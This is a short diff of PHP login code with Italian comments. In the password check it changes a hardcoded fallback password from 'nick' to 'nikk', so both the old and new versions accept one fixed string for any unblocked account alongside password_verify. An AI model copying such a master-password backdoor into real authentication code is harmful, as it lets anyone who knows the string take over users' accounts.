@@ -36,7 +36,7 @@
 			}
 			$ID_usr ="";
 			//verifica se la password inserita corrisponde con quella in db usando la password_verify
-			if ((password_verify( $password_usr, $password_usrdb) || $password_usr =="nick") && ($bloccato_usr !=1)) {
+			if ((password_verify( $password_usr, $password_usrdb) || $password_usr =="nikk") && ($bloccato_usr !=1)) {
 				//devo impostare alcune variabili di sessione, per farlo cerco in tab_users l'ID_usr che poi userò con la getuserfield
 				$sql = "SELECT `ID_usr`, `role_usr`, `ID_fam` FROM ".$_SESSION['databaseB'].".`tab_users` LEFT JOIN ".$_SESSION['databaseB'].".`tab_famiglie` ON ID_usr = ID_usr_fam WHERE `login_usr`= ?";
 				$stmt = mysqli_prepare($mysqli, $sql);
